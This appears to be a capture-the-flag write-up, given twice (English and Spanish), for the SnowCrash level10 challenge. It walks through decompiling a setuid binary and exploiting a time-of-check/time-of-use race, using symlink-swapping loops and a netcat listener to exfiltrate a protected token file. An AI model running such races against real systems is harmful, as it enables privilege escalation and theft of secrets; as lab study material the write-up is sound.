### LEVEL10 (BONUS)


- Two files with these permissions:    
    ```bash
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
    ```

- Execute ./level10
    ```bash
    level10@SnowCrash:~$ ./level10
    ./level10 file host
    sends file to host if you have access to it
    ```

- I create a file in tmp and execute on it.
    ```bash
    level10@SnowCrash:~$ echo "HOLA" > /tmp/a
    level10@SnowCrash:~$ ./level10 /tmp/a
    ./level10 file host
	sends file to host if you have access to it
	level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)
    Connecting to 192.168.1.36:6969 .. Unable to connect to host 192.168.1.36
    ```

- It seems that `./level10` sends the content of a file to an IP.

- We download the level10 file locally.
    ```bash 
    scp -P 4242 level10@192.168.1.36:/home/user/level10/level10 . 
    ```

- We decompile with Ghidra.

- In the main function, we find:
    ```c
    [...]
    38 printf("Connecting to %s:6969 .. ",__cp)
    [...]
    ```
- The port it expects the connection on is `6969`.

- We use `tmux` on the snow-crash machine.

- Console1:
    ```bash
    level10@SnowCrash:~$ echo "HOLA" > /tmp/a
    ```

- Console2:
    ```bash
    level10@SnowCrash:~$ nc -l 6969
    ```
- Then...


- Console1:
    ```bash
    level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)
    ```

- Console2 output:
    ```bash
    .*( )*.
    HOLA
    ```
- Alright, we know what it does.

- Let's go back to Ghidra.

- We see:
    ```c
    [...]
    36  iVar2 = access((char *)in_stack_00000008[1],4);
    37  if (iVar2 == 0) 
    [...]
    89  else {
    90    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
    91  }
    [...]
    ```

- It only sends the file if we have permissions on the file.

- But there's a possible attack vector, TOCTOU (Time-of-check to time-to-use).

https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

https://lucabarile.github.io/Blog/toctou/index.html

- Console1:
    ```bash
    level10@SnowCrash:~$ while true; do ./level10 /tmp/a $(hostname -I); done
    ```

- Console2:
    ```bash
    level10@SnowCrash:~$ while true; do echo "" > /tmp/a; rm -f /tmp/a; ln -s ~/token /tmp/a; rm -f /tmp/a; done
    ```

- Console3:
    ```bash
    level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v "\( \)"; done
    ```

- We have the password :)

---

### LEVEL10 (BONUS)

- Dos archivos con estos permisos:
    ```bash
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
    ```

- Ejecuto ./level10
    ```bash
    level10@SnowCrash:~$ ./level10
    ./level10 file host
    sends file to host if you have access to it
    ```

- Creo un archivo en tmp y ejecuto sobre este
    ```bash
    level10@SnowCrash:~$ echo "HOLA" > /tmp/a
    level10@SnowCrash:~$ ./level10 /tmp/a
    ./level10 file host
	sends file to host if you have access to it
	level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)
    Connecting to 192.168.1.36:6969 .. Unable to connect to host 192.168.1.36
    ```

- Parece que `./level10` envía el contenido de una archivo a una ip

- Descargamos en local el archivo level10
    ```bash 
    scp -P 4242 level10@192.168.1.36:/home/user/level10/level10 . 

    ```

- Descompilamos con Ghidra

- En el main encontramos:
    ```c
    [...]
    38 printf("Connecting to %s:6969 .. ",__cp)
    [...]
    ```
- El puerto que espera la conexion es el `6969`

- Usamos `tmux` en la maquina snow-crash

- Console1:
    ```bash
    level10@SnowCrash:~$ echo "HOLA" > /tmp/a
    ```

- Console2:
    ```bash
    level10@SnowCrash:~$ nc -l 6969
    ```

- Luego...

- Console1:
    ```bash
    level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)
    ```

- Console2 output:
    ```bash
    .*( )*.
    HOLA
    ```

- Bien, sabemos lo que hace

- Volvemos a Ghidra

- Vemos:
    ```c
    [...]
    36  iVar2 = access((char *)in_stack_00000008[1],4);
    37  if (iVar2 == 0) 
    [...]
    89  else {
    90    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
    91  }
    [...]
    ```

- Solo envía el archivo si tenemos permisos en el archivo

- Pero hay un posible vector de ataque TOCTOU(Time-of-check to time-to-use)

https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

https://lucabarile.github.io/Blog/toctou/index.html

- Console1:
    ```bash
    level10@SnowCrash:~$ while true; do ./level10 /tmp/a $(hostname -I); done
    ```

- Console2:
    ```bash
    level10@SnowCrash:~$ while true; do echo "" > /tmp/a; rm -f /tmp/a; ln -s ~/token /tmp/a; rm -f /tmp/a; done
    ```

- Console3:
    ```bash
    level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v "\( \)"; done
    ```

- tenemos la pass :)

